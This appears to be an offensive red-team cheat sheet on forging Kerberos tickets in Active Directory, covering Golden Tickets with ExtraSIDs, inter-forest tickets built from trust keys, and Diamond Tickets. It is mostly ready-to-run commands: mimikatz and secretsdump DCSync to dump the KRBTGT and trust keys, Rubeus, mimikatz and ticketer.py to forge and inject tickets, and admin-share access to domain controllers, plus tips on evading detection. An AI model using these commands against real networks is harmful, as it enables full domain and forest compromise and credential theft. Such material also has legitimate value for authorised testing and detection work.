The abuse of Golden Tickets, ExtraSIDs, and Trust Keys does not correspond to a single technique, but to several ways of forging or modifying Kerberos tickets depending on the compromised cryptographic material and the trust boundary you want to cross.

The logic is simple:

- If you control the KRBTGT key of a domain, you can forge valid TGTs for that domain.
- If you also add ExtraSIDs / SIDHistory, you can extend privileges to other domains within the same forest.
- If the target is in another forest, the approach changes: normally ExtraSIDs are no longer enough, and it becomes necessary to abuse the Trust Key of the trust relationship.

> In intra-forest environments, the PAC with ExtraSIDs is usually accepted across the forest. In inter-forest environments, that same approach will normally be blocked by SID Filtering unless it is disabled.

- [ ] Decision Tree

- If you are in `child.domain.local` and have KRBTGT → you can rise to Enterprise Admin with SIDHistory
- If you are in `atlas.local` and want `ridge.com` → you need the Trust Key no matter what

```powershell
[ Do you have high privileges? ]
            |
            v
      [ YES / High Integrity ]
            |
            v
[ What material have you compromised? ]
            |
   -------------------------
   |                       |
   v                       v
[ KRBTGT ]           [ Trust Key ]
   |                       |
   v                       v
[ Objective? ]        [ Is there a trust between forests? ]
   |                       |
   v                       v
[ Same forest ]       [ YES ]
   |                       |
   v                       v
🔥 GOLDEN TICKET        🌍 INTER-FOREST GOLDEN
(KRBTGT)               (Trust Key)
   |                       |
   v                       v
[ Escalate privileges? ]   [ Pivot cross-forest ]
   |                       |
   v                       v
→ Add ExtraSIDs           → /target + /service:krbtgt
  (ej: -519 EA)            → TGS manual (asktgs)
   |                       |
   v                       v
✅ Enterprise Admin       ✅ Acceso en forest externo
   across the whole forest   (depending on the trust)
``` 

- [ ] Impacto

- Within the same forest (intra-forest): a ticket with ExtraSIDs can be accepted in remote domains of the forest, which allows direct pivoting to groups such as Domain Admins or Enterprise Admins, depending on the added SIDs.
- Outside the forest: the ticket will normally be rejected by SID Filtering.
- In inter-forest relationships: abuse with ExtraSIDs will only work if SID Filtering is disabled. If it is not, the correct approach is to compromise the Trust Key.

- [ ] OPSEC

- Classic Golden Ticket:
    - More “normal” within the domain.
    - Less noisy if used properly.
    - The Kerberos flow usually looks more coherent with the forest topology.
- Trust Key / inter-forest:
    - Rarer and more visible.
    - Introduces Kerberos traffic to another forest.
    - It may require manual TGS requests, which makes the flow less “natural”.

## Classic Golden Ticket (KRBTGT) + SIDHistory (ExtraSIDs) for domain / forest

- [ ] Requirements

```powershell
# 1. Elevated privileges (High Integrity)

# 2. Username to impersonate (e.g., Administrator)

# 3. FQDN and SID of the SOURCE domain (SOURCE.DOMAIN)
ldapsearch (objectClass=domain) --attributes objectSid

# 4. KRBTGT key of the SOURCE domain (SOURCE.DOMAIN), preferably AES
.\mimikatz.exe "privilege::debug" "token:elevate" "lsadump::dcsync /domain:source.domain /user:source\krbtgt" "exit"

# 5. SID of the TARGET domain (TARGET.DOMAIN)
ldapsearch (objectClass=domain) --attributes objectSid --hostname DC01.target.domain --dn DC=target,DC=domain
# objectSid: S-1-5-21-3926355307-1661546229-813047887
```

> The SID of `TARGET.DOMAIN` is appended with the RID of a privileged group, for example `512` or `519`. RID `519` corresponds to Enterprise Admins and exists only in the root domain of the forest, not in subdomains.

- [ ] Golden Ticket creation

> A Golden Ticket forged in a child domain, combined with `SIDHistory / ExtraSIDs` to `-519`, allows escalation to Enterprise Admins of the entire forest.

```powershell
# Rubeus
.\Rubeus.exe golden /user:Administrator /domain:SOURCE_DOMAIN /sid:SID_SOURCE_DOMAIN /aes256:KRBTGT_HASH_SOURCE_DOMAIN /sids:SID_TARGET_DOMAIN-519 /nowrap /ptt

# mimikatz
.\mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:SOURCE_DOMAIN /sid:SID_SOURCE_DOMAIN /krbtgt:KRBTGT_HASH_NTLM_SOURCE_DOMAIN /sids:SID_TARGET_DOMAIN-519 /ptt" "exit"

# Verify loaded tickets
klist
# Client: Administrator @ SOURCE.DOMAIN
# Server: krbtgt/source.domain @ SOURCE.DOMAIN

# Access the resource
ls \\DC01.TARGET.DOMAIN\c$
ls \\FS01.TARGET.DOMAIN\c$
```

- `/user:Administrator`: defines the identity that will appear inside the ticket.
- `/domain:SOURCE.DOMAIN`: specifies the domain for which the TGT is forged.
- `/sid:SID_SOURCE_DOMAIN`: base SID of the `SOURCE` domain, used to build the identity inside the PAC.
- `/aes256:KRBTGT_HASH_SOURCE_DOMAIN`: KRBTGT key of the `SOURCE` domain, used to sign the ticket.
- `/sids:SID_TARGET_DOMAIN-519`: adds privileged SIDs from the target domain; in this case, `519` corresponds to Enterprise Admins.

> Even if you add privileged SIDs from the root domain, the TGT still belongs to the KDC of the domain whose KRBTGT you compromised, that is, `SOURCE.DOMAIN`.

- [ ] Variant with Impacket

```bash
# 1. FQDN and SID of the current SOURCE.DOMAIN domain
ldapsearch (objectClass=domain) --attributes objectSid

# 2. Hash of the KRBTGT account of SOURCE.DOMAIN
secretsdump.py source.domain/user@DC_IP:'pass'@DC_IP -just-dc-user domain/krbtgt

# 3. SID of the TARGET.DOMAIN domain
ldapsearch (objectClass=domain) --attributes objectSid --hostname DC01.target.domain --dn DC=target,DC=domain

# 4. Golden Ticket creation
ticketer.py -aesKey KRBTGT_AES256_HASH -domain SOURCE.DOMAIN -domain-sid SID_SOURCE_DOMAIN -extra-sid SID_TARGET-519 -user Administrator

# Golden Ticket with another user
ticketer.py -aesKey KRBTGT_AES256_HASH -domain SOURCE.DOMAIN -domain-sid SID_SOURCE_DOMAIN -extra-sid SID_TARGET-519 -user ada -user-id RID_USER -groups 500,512,518,519,520 SOURCE.DOMAIN

# 5. Load the ccache
export KRB5CCNAME=Administrator.ccache

# 6. Request the TGS from the Golden TGT
proxychains kvno cifs/DC01.target.domain

# 7. Confirmar
klist
# Client: Administrator @ SOURCE.DOMAIN
# Server: cifs/DC01.target.domain @ TARGET.DOMAIN
```

- `-nthash` = NTLM
- `-aesKey` = AES
- `-extra-sid` = additional SIDs to extend privileges
## Cross-forest Golden Ticket with Trust Key (Inter-Forest TGT Forging)

- [ ] Requirements

1. Elevated privileges (High Integrity)
2. Username to impersonate (e.g. `Administrator`)
3. FQDN and SID of the source domain (`SOURCE.DOMAIN`)

```powershell
ldapsearch (objectClass=domain) --attributes objectSid
```

4. Trust Key (RC4 or AES) of the inter-forest trust (`Trust Account / TDO`)

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:domain.local /user:ATLAS\RIDGE$" "exit"
.\mimikatz.exe "lsadump::trust /patch"
```

5. SID of the TARGET domain (`TARGET.DOM`)

```powershell
ldapsearch (objectClass=domain) --attributes objectSid --hostname DC01.target.domain --dn DC=target,DC=domain
```

> The SID of `TARGET.DOMAIN` can be appended with the RID of privileged groups such as `512` or `519`, but here we are no longer talking about intra-forest extension through KRBTGT, but about abuse of the trust relationship.

- [ ] Inter-forest ticket creation

> Golden Ticket from the child + SIDHistory 519 = Enterprise Admin of the entire forest

```powershell
# Rubeus
.\Rubeus.exe golden /user:Administrator /domain:SOURCE.DOMAIN /sid:SID_SOURCE_DOMAIN /rc4:HASH_TRUST_KEY /sids:SID_TARGET_DOMAIN-519 /service:krbtgt /target:RIDGE.COM /ptt /nowrap

# mimikatz
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:SOURCE.DOMAIN /sid:SID_SOURCE_DOMAIN /rc4:HASH_TRUST_KEY /service:krbtgt /target:RIDGE.COM /sids:SID_TARGET_DOMAIN-519 /ptt"

# Verify loaded tickets
klist

# Access the resource
ls \\DC01.TARGET.DOMAIN\c$
ls \\FS01.TARGET.DOMAIN\c$
```

- [ ] TGS request to the remote KDC

When the ticket is forged using the Trust Key with `/target:`, it is often necessary to manually request a TGS for the service in the target domain. Unlike the classic intra-forest Golden Ticket, here the flow does not always complete automatically when accessing the resource.

```powershell
.\Rubeus.exe asktgs /service:CIFS/dc01.ridge.com /ticket:<ticket_base64> /nowrap /ptt
```

- LSASS or the Kerberos library detects that the SPN belongs to `ridge.com`.
- It looks for a DC in that domain through DNS / SRV.
- It sends the request to the remote KDC over Kerberos (`TCP/UDP 88`).

## Diamond Ticket

- [ ] Requirements

```powershell
# 1. Elevated privileges (High Integrity)

# 2. User to impersonate in SOURCE.DOMAIN

# 3. FQDN and SID of the SOURCE domain (SOURCE.DOMAIN)
ldapsearch (objectClass=domain) --attributes objectSid

# 4. KRBTGT key of the SOURCE domain (SOURCE.DOMAIN), preferably AES
.\mimikatz.exe "privilege::debug" "token:elevate" "lsadump::dcsync /domain:source.domain /user:source\krbtgt" "exit"

# 5. SID of the TARGET domain (TARGET.DOMAIN)
ldapsearch (objectClass=domain) --attributes objectSid --hostname DC01.target.domain --dn DC=target,DC=domain
Get-DomainObject -Identity "DC=target,DC=domain" -Server DC01.target.domain -Properties objectSid | select objectSid

# 6. Existence of a legitimate TGT
.\Rubeus.exe triage
# ada @ SOURCE.DOMAIN | krbtgt/SOURCE.DOMAIN
```

> Just like in the previous case, the SID of the target domain is appended with the RID of the desired privileged group, for example `519` for Enterprise Admins of the root domain.

- [ ] Diamond Ticket creation

> The Diamond Ticket starts from a legitimate TGT already issued by the KDC and reuses it as a template before modifying it and signing it again with the KRBTGT key.

```powershell
# Create the Diamond Ticket
.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:SID_TARGET_DOMAIN-519 /krbkey:KRBTGT_HASH_SOURCE_DOMAIN_AES /nowrap

# Inject it
.\Rubeus.exe ptt /ticket:<ticket>

# Verify
klist
# Client: Administrator @ SOURCE.DOMAIN
# Server: krbtgt/source.domain @ SOURCE.DOMAIN

# Access the resource
ls \\DC01.TARGET.DOMAIN\c$
ls \\FS01.TARGET.DOMAIN\c$
```

- `/tgtdeleg`: obtains a legitimate TGT from the current Kerberos context and uses it as a template.
- `/ticketuser:Administrator`: defines the user represented in the ticket.
- `/ticketuserid:500`: RID of the user within the domain.
- `/sids:SID_TARGET_DOMAIN-519`: adds privileged SIDs from the target domain.
- `/krbkey:KRBTGT_HASH_SOURCE_DOMAIN`: KRBTGT key of the `SOURCE` domain, used to sign the modified ticket.

> Even if you add privileged SIDs from the root domain, the TGT still belongs to the domain whose KRBTGT key you compromised: `SOURCE.DOMAIN`.



